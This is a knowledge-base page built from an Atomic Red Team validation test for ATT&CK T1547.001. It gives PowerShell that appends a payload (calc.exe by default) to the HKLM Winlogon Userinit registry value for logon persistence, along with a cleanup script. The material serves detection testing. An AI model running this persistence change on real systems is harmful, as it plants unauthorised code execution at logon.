---
atomic_guid: "f7fab6cc-8ece-4ca7-a0f1-30a22fccd374"
title: "HKLM - Append Command to Winlogon Userinit KEY Value"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.001"
attack_technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "f7fab6cc-8ece-4ca7-a0f1-30a22fccd374"
  - "HKLM - Append Command to Winlogon Userinit KEY Value"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# HKLM - Append Command to Winlogon Userinit KEY Value

This test will append a command to the  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit value to launch calc.exe on boot.
* Requires reboot

## Metadata

- Atomic GUID: f7fab6cc-8ece-4ca7-a0f1-30a22fccd374
- Technique: T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1547.001/T1547.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.001]]

## Input Arguments

### payload

- description: what to run
- type: string
- default: C:\Windows\System32\calc.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
$newvalue = $oldvalue + " #{payload}";
Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
```

### Cleanup

```powershell
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup');
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml)
